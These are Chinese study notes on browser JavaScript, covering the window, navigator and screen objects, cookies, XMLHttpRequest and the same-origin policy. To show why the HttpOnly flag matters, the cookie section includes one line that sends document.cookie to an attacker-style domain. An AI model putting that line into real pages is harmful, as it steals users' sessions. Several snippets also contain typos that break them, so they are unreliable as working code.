## 第十章 BOM

### 10.1 BOM基本原理

#### 概念

JS 代码嵌入网页有四种方法：

- script 嵌入内部代码，type = 'text/javascript' 说明脚本的类型。早期浏览器使用 'text/javascript' 新浏览器推荐使用 'application/javascript'。如果是其他参数，脚本不会执行（可以利用这个方法，传入其他信息，使用DOM方法获取脚本内容）
- script 嵌入外部代码，设置 src 属性是外部的JS代码。如果内部外部同时使用，内部代码不会生效。script 脚本可以添加一个 integrity 属性，写入脚本的哈希签名，验证外部脚本的一致性，避免外部脚本篡改。
- HTML 行内代码：事件触发后可以执行脚本 onclick='console.log('click');'
- A 内部：`<a href="javascript:console.log('Hello')">点击</a>` 如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。

脚本执行原理：

- 浏览器下载HTML，下载并开始解析
- 遇到JS代码，停止HTML解析；开始JS解析；如果是外部JS代码，需要下载完毕后解析JS。如果下载时间较长，会产生阻塞。所以通常把JS脚本放在页面底部。如果在头部加载，DOM没有渲染，可能JS出错
- 解析JS完毕后，继续解析HTML界面

浏览器对于同一个域名下的资源数量有限制，为了避免服务器请求过多；如果资源很多，可以放在不同的域名下。

#### defer 属性

外部的脚本，如果添加了defer属性，就会在HTML下载解析结束后再执行这个脚本。浏览器解析HTML和下载脚本过程是并行的，这样会避免阻塞。

#### async 属性

浏览器遇到async属性的脚本，会使用另一个进程下载脚本，下载过程中不会造成阻塞。下载JS任务和解析HTML是并行的。当脚本下载完毕，暂停DOM渲染，执行JS脚本。执行完毕后，继续界面的DOM渲染。注意：如果多脚本异步下载，先下载的脚本会先执行。

defer 和 async 使用：如果脚本间有较强的依赖性（babel react）需要使用defer（设置async属性是false），如果脚本间没有依赖性，可以使用 async。

#### 加载协议

默认协议是HTTP协议，可以在Scr属性中设置其他协议下载，或者根据界面自身的协议下载。

~~~html
<script src="https://test.js"></script>
<script src="//example.js"></script>
~~~

#### 浏览器组成

浏览器有DOM渲染引擎和JS解释器（JS引擎）组成

**渲染引擎**：Firefox：Gecko；Safari：WebKit ；Chrome：Blink ；IE: Trident ；Edge: EdgeHTML

**渲染引擎工作流程**：HTML解析成DOM，CSS解析成CSSOM（object model），将这两部分合成渲染树（render tree），计算渲染树的布局（layout），将渲染树绘制到屏幕。这几部分不是完全先后执行的，可能一部分已经渲染，另一部分HTML还在下载

#### 重绘和重流

**布局（布局流，flow）和绘制（paint）**：渲染树转化成网页布局（layout）的过程叫布局，网页布局（layout）转化成屏幕显示叫绘制。这两部分会阻塞并且消耗性能。

**重绘和重流**：页面首次生成后，操作脚本和样式表会造成界面的重流或重绘。重流必然造成重绘，重绘不会造成重流。如果改变文字颜色，页面的布局不会改，所以不会重流，只会重绘。如果改变文本内容，界面布局会改变，会重流重绘。浏览器会对比改变前后的渲染树的差别，计算出变化的部分diff，不会重新加载整个网页，只渲染一部分子树。开发中尽量减少重流和重绘，尽量不要改变顶层的DOM节点，table布局和flex布局会消耗性能。

#### 性能优化

- 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。使用`documentFragment`操作 DOM，使用虚拟 DOM（virtual DOM）库。缓存 DOM 信息。

- 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。动画使用`absolute`定位或`fixed`定位，这样可以减少对其他元素的影响。只在必要时才显示隐藏元素。

- 使用`window.requestAnimationFrame()`，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流。

  ~~~js
  function doubleHeight(ele) {
    let currentHeight = ele.clientHeight;
    window.requestAnimationFrame(() => {
      // 可以把代码所有的写操作几种到一起，这样会减少DOM变动的开销，重绘代价少
      ele.style.height = (currentHeight * 2) + 'px';
    });
  }
  
  elements.forEach(doubleHeight);
  ~~~

#### **JS 引擎**

JS是解析型语言。早期浏览器内部对 JavaScript 的处理过程如下：

1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。

逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。

字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：

- [Chakra](https://en.wikipedia.org/wiki/Chakra_(JScript_engine)) (Microsoft Internet Explorer)
- [Nitro/JavaScript Core](http://en.wikipedia.org/wiki/WebKit#JavaScriptCore) (Safari)
- [Carakan](http://dev.opera.com/articles/view/labs-carakan/) (Opera)
- [SpiderMonkey](https://developer.mozilla.org/en-US/docs/SpiderMonkey) (Firefox)
- [V8](https://en.wikipedia.org/wiki/Chrome_V8) (Chrome, Chromium)



### 10.2 window 对象

window对象和JS中普通对象类似，具有属性和方法，也会触发事件。

window对象是当前浏览器窗口的顶层对象。如果一个没有声明的变量直接使用，就会自动转化成顶层对象的属性（window的属性）。

#### 属性

**常规属性**

~~~js
window.name 表示当前浏览器窗口的名字（字符串，容量可以高达几MB）；只要浏览器窗口不关闭，跳转另一个页面（或者刷新当前窗口），前一个浏览器窗口名字设置不会变化。
window.closed 判断窗口是否关闭(可以监测使用脚本打开的新窗口是否关闭)
window.opener 属性表示打开当前窗口的父窗口 如果没有父窗口，就返回 null。如果两个窗口不需要通信，就设置子窗口 window.opener === null 这样可以切断父窗口的联系。<a>元素添加rel="noopener"属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。
window.self 
window.window 指向本身
window.status 读取浏览器状态栏的文本(兼容早期浏览器)
~~~

~~~html
<a href="https://an.evil.site" target="_blank" rel="noopener"></a>
~~~

**框架的属性**

~~~js
window.frames 返回当前页面内所有的框架窗口(伪数组) 包括frame iframe
window.length 返回框架窗口的数量
window.frameElement 如果一个窗口被嵌入另一个窗口，这个属性返回原始的父窗口。如果当前窗口是顶层窗口，或者和父窗口不是同源的，那么返回值是null。
window.top 执行顶层窗口。主要用于框架窗口中获取顶层窗口，如果没有框架，返回window
window.parent 返回父窗口；如果没有父窗口，返回自身
~~~

**高清屏幕的属性**

window.devicePixelRatio 返回显示像素和物理像素的比值：如果比例较大，说明处于高清屏幕(当前是2)

**位置属性**

~~~js
window.screenX screenY 浏览器左上角相对于屏幕的位置
window.innerHeight window.innerWidth 浏览器视口的尺寸(包括滚动条)如果界面变成200%， 那么视口会变小
window.outerHeight window.outerWidth 浏览器窗口的尺寸(包括菜单栏和border)
window.scrollX scrollY 
~~~

组件属性：获取浏览器的组件对象（状态栏地址栏工具栏等）

全局对象属性：document/location/navigator/history/localStorage/sessionStorage/console/screen

window.isSecureContext 返回是否处于加密状态（https）

#### 方法

~~~js
window.alert()
window.confirm()
window.prompt()

window.open(url, windowName, windowFeature)
window.close() 关闭当前的窗口
window.stop() 停止当前窗口的加载(等价于浏览器停止按钮)
~~~

~~~js
第二个参数：windowName：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用_blank，表示新建一个没有名字的窗口。另外还有几个预设值，_self表示当前窗口，_top表示顶层窗口，_parent表示上一层窗口。

open()方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许open方法指向该窗口。如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。

第三个参数表示新打开窗口的属性，是一个字符串(array.join(',')),属性见 https://wangdoc.com/javascript/bom/window.html

var popup = window.open(
  'somepage.html',
  'DefinitionsWindows',
  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
);
~~~

~~~js
window.moveTo()
window.moveBy()
把当前窗口移动到某个坐标，或者移动某个位移，这个窗口必须是新建的窗口

window.resizeTo(window.screen.availWidth / 2, window.screen.availHeight / 2)
window.resizeBy(-100, -200)
当前窗口缩放到某个尺寸(屏幕的一半)

window.scrollTo window.scrollBy
window.print()
window.focus() window.blur() 通常打开一个新窗口并获得焦点(显示在页面最前面)

let selectionObj = window.getSelection();
let text = selectionObj.toString();

window.getComputedStyle()
window.matchMedia()
~~~

**window.requestAminationFrame()**

这个方法类似于 setTimeout 会推迟函数到浏览器下一次重流时执行，执行完才会进行下一次重绘，这个函数没有设定时间，浏览器可以根据设备的速度调节执行的时间。如果函数改变网页的布局，可以使用这个方法，这样可以节省系统资源，使得网页效果更加平滑。

window.requestAnimationFrame(callback) 回调函数可以获取一个时间戳，表示距离网页加载的时间

`window.requestAnimationFrame()`的返回值是一个整数，这个整数可以传入window.cancelAnimationFrame()，用来取消回调函数的执行。下面是一个界面动画

~~~js
var element = document.getElementById('animate');
element.style.position = 'absolute';

var start = null;

function step(timestamp) {
  if (!start) {
    start = timestamp;
  }
  var progress = timestamp - start;
  // 元素不断向左移，最大不超过200像素
  element.style.left = Math.min(progress / 10, 200) + 'px';
  // 如果距离第一次执行不超过 2000 毫秒，
  // 就继续执行动画
  if (progress < 2000) {
    window.requestAnimationFrame(step);
  }
}

window.requestAnimationFrame(step);
~~~

**window.requestIdleCallback()**

`window.requestIdleCallback()`跟`setTimeout`类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用`window.requestIdleCallback()`将其推迟执行，以保证网页性能。

它跟`window.requestAnimationFrame()`的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；`window.requestIdleCallback()`可以保证回调函数在系统资源空闲时执行。

该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空虚，都会执行。

```
window.requestIdleCallback(callback[, options])
```

`callback`参数是一个回调函数。该回调函数执行时，系统会传入一个`IdleDeadline`对象作为参数。`IdleDeadline`对象有一个`didTimeout`属性（布尔值，表示是否为超时调用）和一个`timeRemaining()`方法（返回该空闲时段剩余的毫秒数）。

`options`参数是一个配置对象，目前只有`timeout`一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。

`window.requestIdleCallback()`方法返回一个整数。该整数可以传入`window.cancelIdleCallback()`取消回调函数。

下面是一个例子。

```js
requestIdleCallback(myNonEssentialWork);

function myNonEssentialWork(deadline) {
  while (deadline.timeRemaining() > 0) {
    doWorkIfNeeded();
  }
}
```

上面代码中，`requestIdleCallback()`用来执行非关键任务`myNonEssentialWork`。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。

下面是指定`timeout`的例子。

```js
requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });
```

上面代码指定，`processPendingAnalyticsEvents`必须在未来2秒之内执行。

如果由于超时导致回调函数执行，则`deadline.timeRemaining()`返回`0`，`deadline.didTimeout`返回`true`。

如果多次执行`window.requestIdleCallback()`，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。 

#### 事件

~~~js
window.onload = function() {
  //
}
window.onerror = function(message, filename, lineno, colno, error) {
  // JS脚本错误会触发onerror
}
window.onafterprint：afterprint事件的监听函数。
window.onbeforeprint：beforeprint事件的监听函数。
window.onbeforeunload：beforeunload事件的监听函数。
window.onhashchange：hashchange事件的监听函数。
window.onlanguagechange: languagechange的监听函数。
window.onmessage：message事件的监听函数。
window.onmessageerror：MessageError事件的监听函数。
window.onoffline：offline事件的监听函数。
window.ononline：online事件的监听函数。
window.onpagehide：pagehide事件的监听函数。
window.onpageshow：pageshow事件的监听函数。
window.onpopstate：popstate事件的监听函数。
window.onstorage：storage事件的监听函数。
window.onunhandledrejection：未处理的 Promise 对象的reject事件的监听函数。
window.onunload：unload事件的监听函数。
~~~

#### 多窗口操作

一个网页可以使用iframe嵌入其他网页，这样一个界面会嵌套多层网页（这个技术现在过时了）。

通过下面的属性判断是否是顶层窗口：window.top window.parent window.self 

~~~js
if (window.top === window.self) {
  // 当前窗口是顶层窗口
}
~~~

~~~html
<a href="somepage.html" target="_top">Link</a> 表示在顶层窗口打开链接
~~~

**iframe 元素**

~~~js
let iframe = document.getElementBuId('#frame');
let innerWindow = iframe.contentWindow;
let innerDocument = iframe.contemtDocument;
innerWindow.frameElement === iframe
// 获取子窗口的window对象

// 如果在同源的情况下，可以获取内部window的属性
innerWindow.title
~~~

如果父窗口和子窗口处于同源时，两个窗口间可以直接通信

window.frames 可以获取当前窗口中全部子窗口的伪数组



### 10.3 Navigator

Navigator 这个对象可以反映用户浏览器和系统信息

~~~js
Navigator.userAgent // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36" 获取浏览器的厂商和基本信息。以前通过这个属性获取用户浏览器名称来处理兼容性。现在由于PC端版本复杂，一般不使用了。现在通过功能识别的方式，获取浏览器信息。可以通过这个属性判断手机浏览器和PC端大类

var ua = navigator.userAgent.toLowerCase();

if (/mobi/i.test(ua)) {
  // 手机浏览器
} else {
  // 非手机浏览器
}

/mobi|android|touch|mini/i.test(ua)

Navigator.plugins 返回一个伪数组，是浏览器的插件(flash)
Navigator.platform 用户操作系统 "Linux x86_64" 但是自己测试不生效
Navigator.onLine 返回用户在线或者离线 如果是false，肯定离线；如果是true，可能用户所在局域网也是离线的，可以通过事件监听获取用户在线情况

window.addEventListener('offline', function(e) { console.log('offline'); });
window.addEventListener('online', function(e) { console.log('online'); });

Navigator.language，Navigator.languages 表示用户的首选语言，和可以接受的语言(浏览器翻译界面使用)
~~~

~~~js
Navigator.geolocation 包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用。
Geolocation 对象提供下面三个方法。
Geolocation.getCurrentPosition()：得到用户的当前位置
Geolocation.watchPosition()：监听用户位置变化
Geolocation.clearWatch()：取消watchPosition()方法指定的监听函数
注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。

Navigator.cookieEnabled 这个属性反映的是浏览器总的特性
~~~

下面是常见的方法

~~~js
Navigator.javaEnabled() 返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。
Navigator.sendBeacon() 用于向服务器异步发送数据
~~~

### 10.4  Screen

Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。`window.screen`属性指向这个对象。

- `Screen.height`：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
- `Screen.width`：浏览器窗口所在的屏幕的宽度（单位像素）。
- `Screen.availHeight`：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于`height`减去那些被系统组件的高度。
- `Screen.availWidth`：浏览器窗口可用的屏幕宽度（单位像素）。
- `Screen.pixelDepth`：整数，表示屏幕的色彩位数，比如`24`表示屏幕提供24位色彩。
- `Screen.colorDepth`：`Screen.pixelDepth`的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
- `Screen.orientation`：返回一个对象，表示屏幕的方向。该对象的`type`属性是一个字符串，表示屏幕的具体方向，`landscape-primary`表示横放，`landscape-secondary`表示颠倒的横放，`portrait-primary`表示竖放，`portrait-secondary`。

下面是`Screen.orientation`的例子。具体的内容参考：

https://www.cnblogs.com/ndos/p/8245164.html

https://www.cnblogs.com/crafts/articles/5750522.html

```js
window.screen.orientation
// { angle: 0, type: "landscape-primary", onchange: null }
```

下面的例子保证屏幕分辨率大于 1024 x 768。

```js
if (window.screen.width >= 1024 && window.screen.height >= 768) {
  // 分辨率不低于 1024x768
}
```

下面是根据屏幕的宽度，将用户导向不同网页的代码。

```js
if ((screen.width <= 800) && (screen.height <= 600)) {
  window.location.replace('small.html');
} else {
  window.location.replace('wide.html');
}
```

### 10.5 Cookie:a:

#### 概述

cookie 是服务器在浏览器存储的很小的文本信息，通常小于4KB， 浏览器发出请求时，会附带cookie。服务器可以判断两次的请求是否来源于一个浏览器，可以保存用户自定义设置（语言，侧栏宽度，风格），保存token。注意：cookie 很小，不适合保存大量数据，如果cookie很大影响性能（大量存储放在storage中）。cookie包括：

- Cookie 的名字
- Cookie 的值（真正的数据写在这里面）
- 到期时间
- 所属域名（默认是当前域名）：如果是某个域名下的cookie，URL必须是这个域名才能携带这部分cookie
- 生效的路径（默认是当前网址）

可以通过 window.navigator.cookieEnabled 判断浏览器是否支持cookie。

根据同源策略：两个网址只要域名和端口相同可以共享cookie(协议不同也可以)

#### cookie 与 http

浏览器发出请求，服务器在响应头中可以设置cookie(可以设置多个cookie)	如果服务器端想改一个cookie，需要域名和路径完全相同才能改。

~~~bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: token=sdfghjklertyuiop
Set-Cookie: tasty_cookie=strawberry
Set-Cookie: key1=value2; domain=example.com; path=/blog
~~~

浏览器发出请求时，就会携带cookie；服务器获取cookie后，不能判断cookie的过期时间和路径

~~~bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: token=sdfghjklertyuiop; yummy_cookie=choco; tasty_cookie=strawberry
~~~

#### 属性

Expires Expires 表示cookie的过期时间，浏览器根据本地时间确定cookie是否过期（本地时间可能不准确）；

Max-Age Max-age 表示从现在开始，cookie 存在的秒数（7天内登录）；如果不设置这两个属性，那么 cookie 就是 session（对话） cookie，就在本次对话结束后销毁。

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

Domain 说明cookie的域名和路径，只有满足这个域名后，发送请求才添加cookie；

Path 只有URL中包括路径才添加cookie（前提是同源策略，域名和端口号一致）

Secure 只有协议是HTTPS才保存cookie，如果是http请求，浏览器会忽略这个cookie

HTTPOnly 只有http请求才能获取并发送当前的cookie，不能通过脚本获取cookie，避免恶意脚本跨站注入攻击。这里创建一个空图片，并把cookie发送到一个危险网站（用户名和密码）；如果设置了一个 Cookie 的`HttpOnly`属性，JS代码就不会读到该 Cookie。

~~~js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
~~~

document.cookie 获取当前的cookie（HttpOnly属性不设置时可以获取）获取的是cookie字符串，需要转化

~~~js
var cookies = document.cookie.split(';');
~~~

这个属性可写（可以通过脚本对当前网站添加Cookie）==写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值）==，这可以用`encodeURIComponent`方法达到。`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。如果添加多个属性，可以先转化成数组，改变数组，最后保存cookie的值（例如界面评论栏的宽度）；写入cookie 时可以同时写入相关属性（过期时间）

~~~js
document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
~~~

Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。

~~~js
document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
~~~

### 10.6 XMLHttpequest:a:

#### 概述

Ajax: 异步JS和XML；脚本发起通信，就是ajax。

步骤：创建XMLHttpRequest实例对象，发送请求，服务器响应，获取数据更新界面。

现在ajax返回的数据不是XML格式，通常是JSON格式，但是ajax还保留。现在不仅仅是http协议，file ftp 协议也可以，发送的数据格式不限制。ajax只能向同源网址（协议域名端口相同）发送请求，如果跨域会报错。

下面是原生ajax发送get请求：

~~~js
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      console.log(xhr.responseText);
    } else {
      console.log(xhr.status);
      cosnole.log(xhr.statusText);
    }
  }
};

xhr.omerror = function() {
  console.error(xhr.statusText);
};

xhr.open('GET', 'http://example.com/page.php', true);
// 第三个参数表示异步发送请求
xhr.send(null);
// get 请求不带参数
~~~

上面的案例在 example.com 请求，可以获取下面的返回值。如果不是同源，会显示CORS阻止。

~~~txt
The page at 'https://wangdoc.com/javascript/bom/xmlhttprequest.html' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://www.example.com/page.php'. This request has been blocked; the content must be served over HTTPS.
~~~

~~~html
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is established to be used for illustrative examples in documents. You may use this
    domain in examples without prior coordination or asking for permission.</p>
    <p><a href="http://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>
~~~

#### 实例属性

~~~js
xhr.readyState 表示请求的状态，4表示请求已经完成，属性变化时，
xhr.onreadystatechange 会捕获到这个事件
xhr.response 服务器返回的数据，如果请求状态是4，就是全部返回的数据；如果请求没有结束（3），这个参数就是返回的部分数据；可以使任何的数据类型
xhr.responseType 表示服务器返回的数据类型，属性可写，默认是text。在open方法后，send方法前可以改变这个参数，参数可以取下面的值。

"arraybuffer"：ArrayBuffer 对象，表示服务器返回二进制数组。（使用数组的方式处理二进制数据，例如图片）
"blob"：Blob 对象，表示服务器返回二进制对象。适合图片传递。
"document"：Document 对象，表示服务器返回一个文档对象。操作DOM时，直接返回document可以加载到界面中（需要打开CORS）
"json"：JSON 对象。
"text"：字符串。直接处理比较方便
~~~

~~~js
let xhr = new XMLHttpRequest();
xhr.open('GET', 'path/iamge/test.png', true);
xhr.responseType = 'blob';
xhr.onreadystatechange = function() {
  if (xhr.readystate === 4 && xhr.status === 200) {
    let res = xhr.response;
    let blob = new Blob([res], {type: 'image/png'});
    // or let blob = xhr.response
  }
}
xhr.send();

// 二进制数组 arraybuffer 处理图片的请求
xhr.open('GET', 'to/test.png', true);
xhr.responseType = 'arraybuffer';
xhr.onload = function() {
  let uInt8Array = new Uint8Array(this.response);
  for (var i = 0, len = binStr.length; i < len; ++i ) {
    var byte = uInt8Array[i];
  }
}
~~~

下面实例属性是服务器返回值属性

~~~js
xhr.responseText 服务器返回的字符串(如果返回的不是txt文本，这个属性是null)
xhr.responseXML (首先设置responseType === document) 这个属性是解析后的DOM树
xhr.responseURL 获取服务器的网址：通常和open中参数相同，网页跳转后，这个网址就是实际返回数据的网址。

xhr.status 返回HTTP状态码
xhr.statusText “OK”和“Not Found” 对应200和404
xhr.timeout 设置毫秒数，如果请求超时，停止请求（下面是例子）
~~~

~~~js
var xhr = new XMLHttpRequest();

xhr.ontimeout = function (e) {
  console.error(e);
};

xhr.onload = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      // 处理服务器返回的数据
    } else {
      console.error(xhr.statusText);
    }
  }
};

xhr.open('GET', url, true);
xhr.timeout = 10 * 1000; // 指定 10 秒钟超时
xhr.send(null);
~~~

下面是事件监听属性

~~~js
XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数
XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数
这个事件对象具有三个属性：loaded total lengthComputable(布尔值，表示加载的进度是否可以计算)这里可以使用 loaded/total 获取已加载的百分比

XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了abort()方法）的监听函数
XMLHttpRequest.onerror：error 事件（请求失败）的监听函数
XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数
XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数
XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数
~~~

~~~js
xhr.withCredentials 表示跨域请求时，用户信息（cookie）是否包含在请求头中（默认是false）如果是同域请求，不需要设置这个属性
浏览器设置 xhr.withCredentials = true; 服务器会返回 Access-Control-Allow-Credentials: true 
~~~

上传文件时，可以获取上传的进度，使用 upload 获取上传的进度

~~~html
<process min="0" max="100" value="0">0%</process>
~~~

~~~js
function upload(blobOrFile) {
  let xhr = new XMLHttpRequest();
  xhr.open('POST', '/server', true);
  xhr.onload = function(e) {
    console.log(e);
  }
  let progressBar = document.querySelector('progress');
  xhr.upload.onprogress = function(e) {
    progressBar.value = (e.loaded/e.total) * 100;
    progressBar.textContent = progressBar.value; // 兼容老浏览器
  }
  xhr.send(blobOrFile);
}

let file = new Blob(['hello world']);
upload(file, {type: 'text/plain'});
~~~

#### 实例方法

- xhr.open('GET', url, true, userName, password) 传输的方法，URL，是否异步（默认是异步），用户名和密码（后两个参数可选）如果对使用过open的xhr再次使用open，相当于 abort 关闭这个请求。

- xhr.sned(data); 如果是get请求，只发送URL，这里直接传null即可。如果是post请求，这里需要传入数据。数据的格式可以是blob DOM string arraybuffer formdata(表单更常用)

  ~~~js
  var formData = new FormData();
  formData.append('username', '张三');
  formData.append('email', 'zhangsan@example.com');
  formData.append('birthDate', 1940);
  
  xhr.open('POST', 'http://www.example.com', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send(formData);
  ~~~

- xhr.setRequestHeader('Content-Type', 'application/json');  设置请求头的信息，必须位于xhr.open() 和 xhr.send() 之间。第一个参数是字段名，第二个是字段值。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。

  ~~~
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
  xhr.send(JSON.stringify(data));
  这里设置了数据类型是JSON，设置数据的长度。改进：stringify 耗时，可以执行一次
  ~~~

- xhr.overrideMimeType('text/plain') 这个方法尽量不要使用；如果指定某一个数据类型，返回的数据是text/xml，但是各种原因造成浏览器解析不成功，需要获取原始数据，那么就设置这个属性。如果希望服务器返回指定的数据类型，可以用`responseType`属性告诉服务器。

- xhr.getResponseHeader('Last') 获取响应头的信息

  ~~~js
  xhr.onload = () => {
    console.log(this.getResponseHeader('Last-Modified'));
  }
  ~~~

- xhr.getAllResponseHeaders() 获取响应头的全部信息（字符串）
  
  ~~~txt
  date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
  content-encoding: gzip\r\n
  x-content-type-options: nosniff\r\n
  server: meinheld/0.6.1\r\n
  x-frame-options: DENY\r\n
  content-type: text/html; charset=utf-8\r\n
  connection: keep-alive\r\n
  strict-transport-security: max-age=63072000\r\n
  vary: Cookie, Accept-Encoding\r\n
  content-length: 6502\r\n
  x-xss-protection: 1; mode=block\r\n
  ~~~
  
  可以处理这个字符串获取信息
  
  ~~~js
  var headerString = xhr.getAllResponseHeaders();
  let arr = headerString.trim().split(/[\r\n]+/);
  let headerInfo = {};
  
  arr.forEach((item) => {
    let parts = item.split(': ');
    let key = parts.shift();
    let value = parts.join(': ');
    headerInfo[key] = value;
  });
  ~~~
  
- xhr.abort() 终止发送的请求，此时 readyState is 4, status is 0.

#### 实例事件

- readystatechange === 4 请求成功，可以获取服务器返回的数据
- progress 返回上传的进度 xhr.addEventListener('progress', updateProgress);
- load abort error
- loadend 上面三个事件后，会触发这个事件，但是不确定是否加载成功
- timeout 超时事件

#### Navigator.sendBeacon()

如果在界面关闭时，需要发送请求，那么请求是异步的，可能界面已经卸载了才发送请求，这样会造成错误。传统的解决思路是设置一个睡眠函数或者消耗函数拖延时间，但是用户体验和浏览器性能不好。

~~~js
// a time-consuming operation, bad
for (let i = 1; i < 10000; i++) {
  for (let m = 1; m < 10000; m++) {
    continue;
  }
}
~~~

所以使用 Navigator.sendBeacon() 方法：这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。

~~~js
// <body onload="analytics('start')" onunload="analytics('end')">
function analytics(state) {
  if (!navigator.sendBeacon) {
    return;
  }
  var data = 'state=' + state + '&location=' + window.location;
  navigator.sendBeacon('http://example.com/analytics', data);
}
~~~

### 10.7 同源策略

#### Same-origin 介绍

起源：不同源的网页不能打开cookie。

同源：协议域名端口都相同。

目的：保证用户数据的安全，防止恶意网站窃取用户数据。

现在：无法获取非同源网页的cookie，localStorage，IndexedDB；DOM；无法发送AJAX请求。

非同源网页可以调用下面的属性和方法。

~~~js
window.closed
window.frames
window.length
window.location
window.opener
window.parent
window.self
window.top
window.window
window.blur()
window.close()
window.focus()
window.postMessage()
~~~

#### Cookie 共享

两个网页的一级域名相同（seafile.com）次级域名不同（docs.demo）可以设置 document.domain 相同来共享cookie，设置是会重置端口为null。两个页面需要同时设置 document.domain = 'seafile.com'; 才能达到同源的目的。设置后两个界面可以通过 document.cookie 获取相同的信息。

#### iframe多窗口通信

一个界面中嵌入多个窗口，一个窗口可以获取父窗口和子窗口的window，如果不同源，不能操作DOM（document.getElementByID('myIframe')..contentWindow.document 会报错）。

如果两个窗口的一级域名相同，次级域名不同，可以类似cookie 设置 document.domain。

如果l两个窗口完全不同源，需要使用下面的两个方案（开发中未使用）：



**片段识别符**

片段标识符（fragment identifier）指的是，URL 的`#`号后面的部分，比如`http://example.com/x.html#fragment`的`#fragment`。如果只是改变片段标识符，页面不会重新刷新。

父窗口可以把信息，写入子窗口的片段标识符。

```
var src = originURL + '#' + data;
document.getElementById('myIFrame').src = src;
```

